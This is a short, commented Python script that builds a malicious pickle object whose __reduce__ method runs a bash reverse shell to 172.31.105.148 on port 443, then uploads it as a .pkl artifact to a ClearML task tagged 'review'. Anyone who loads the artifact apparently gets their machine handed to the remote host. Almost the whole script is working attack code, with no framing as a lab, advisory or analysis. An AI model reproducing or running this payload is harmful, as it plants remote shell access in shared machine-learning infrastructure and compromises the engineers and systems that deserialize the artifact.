import pickle, os  # Import pickle for object serialization, os for executing system commands

class RunCommand:
    def __reduce__(self):
        # Defines how the object should be deserialized, using os.system to execute a reverse shell command
        return (os.system, ('/bin/bash -c "/bin/bash -i >& /dev/tcp/172.31.105.148/443 0>&1"',))

command = RunCommand()  # Create an instance of RunCommand

from clearml import Task  # Import Task from clearml for task management and tracking

# Initialize a ClearML task with specified project name, task name, and tags
task = Task.init(project_name='Black Swan', task_name='pickle_artifact_upload', tags=["review"])

# Upload the command object as a ClearML task artifact, serialized as a .pkl file
# Set retries to 2 and wait for the upload to complete
task.upload_artifact(name='pickle_artifact', artifact_object=command, retries=2, wait_on_upload=True, extension_name=".pkl")
